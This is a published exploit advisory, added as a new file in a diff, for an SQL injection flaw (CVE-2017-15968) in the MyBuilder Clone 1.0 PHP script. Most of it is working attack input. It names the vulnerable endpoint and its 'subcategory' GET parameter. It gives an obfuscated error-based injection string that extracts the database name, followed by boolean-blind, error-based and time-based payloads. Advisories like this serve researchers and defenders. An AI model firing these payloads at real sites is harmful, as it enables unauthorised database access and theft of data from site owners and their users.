@@ -1,0 +1,40 @@
+# # # # # 
+# Exploit Title: MyBuilder Clone 1.0 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.contractorscripts.com/
+# Software Link: http://order.contractorscripts.com/
+# Demo: http://demo.contractorscripts.com/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15968
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/phpsqlsearch_genxml.php?subcategory=[SQL]
+# 
+# 1'++aND(/*!09999sELeCT*/+0x30783331+/*!09999FrOM*/+(/*!09999SeLeCT*/+cOUNT(*),/*!09999CoNCaT*/((sELEcT(sELECT+/*!09999CoNCAt*/(cAST(dATABASE()+aS+cHAR),0x7e,0x496873616E53656e63616e))+fROM+iNFORMATION_sCHEMA.tABLES+wHERE+tABLE_sCHEMA=dATABASE()+lIMIT+0,1),fLOOR(rAND(0)*2))x+fROM+iNFORMATION_sCHEMA.tABLES+gROUP+bY+x)a) AND ''='
+# 
+# Parameter: subcategory (GET)
+#     Type: boolean-based blind
+#     Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+#     Payload: subcategory=1' RLIKE (SELECT (CASE WHEN (9811=9811) THEN 1 ELSE 0x28 END))-- gzxz
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: subcategory=1' AND (SELECT 1213 FROM(SELECT COUNT(*),CONCAT(0x7162626a71,(SELECT (ELT(1213=1213,1))),0x716b6a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qHTp
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 OR time-based blind
+#     Payload: subcategory=1' OR SLEEP(5)-- RvzR
+# 	
+# Etc..
+# # # # #
